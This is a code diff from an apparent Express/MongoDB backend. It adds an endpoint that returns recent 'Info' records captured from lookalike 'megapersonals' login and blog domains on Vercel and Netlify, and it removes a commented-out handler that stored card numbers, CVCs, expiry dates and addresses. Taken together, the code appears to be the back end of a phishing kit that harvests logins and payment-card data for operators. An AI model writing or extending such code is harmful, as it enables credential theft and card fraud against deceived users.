@@ -76,6 +76,62 @@ export const yoyo = async (req, res) => {
 }
 
 
+// export const getData = async (req, res) => {
+
+//     const{id}=req.params
+    
+    
+//         try {
+       
+//             const originalData = await Info.find({
+//                 // createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+
+//                 createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+//                 site:{$in: ['megaperssonal.vercel.app', 'megapersonalls-join.vercel.app']}
+//               })
+    
+//             return res.status(200).json({ originalData})
+    
+    
+//         } catch (e) {
+//             res.status(400).json({ e: "error" })
+//         }
+    
+//     }
+
+
+
+    export const getData =  (req, res) => {
+
+        const query = {
+
+            createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+                    site:{$in: ['https://megapersonals-login.netlify.app']}
+            // createdAt: { $gte: new Date('2023-01-01'), $lte: new Date('2023-12-31') },
+          };
+        
+      
+           
+               Info.find({    
+                // site:{$in: ['megapersonalss.vercel.app']}
+                    site:{$in: ['megapersonals-blog-post.vercel.app','megapersonals-login.netlify.app']}
+                    // createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)}
+                    // createdAt: new Date()
+
+
+                  }) .then(results => {
+                    return res.status(200).json({ results})
+                })
+                  .catch(error => {
+                    console.error(error);
+                  });
+        
+        
+        
+           
+        
+        }
+
 
 export const   signup_post = async (req, res) => {
     const { username, password, links, adminId, numOfPostersPermission } = req.body;
@@ -216,24 +272,7 @@ export const card_add = (req, res) => {
 
         return res.status(200).json({ success:"true" })
     })
-    // try {
-        
-
-    //         await Info.findOneAndUpdate({_id:id}, { validity,address,cardNumber,cvc,name,zipCode}, {
-    //             new: true,
-    //             upsert: true
-    //         });
-    //      return   res.status(200).json({ success: true })
-
-       
-
-    // }
-    // catch (e) {
-
-    //     return   res.status(400).json({ e: "error" })
-
-
-    // }
+   
 
 
 }
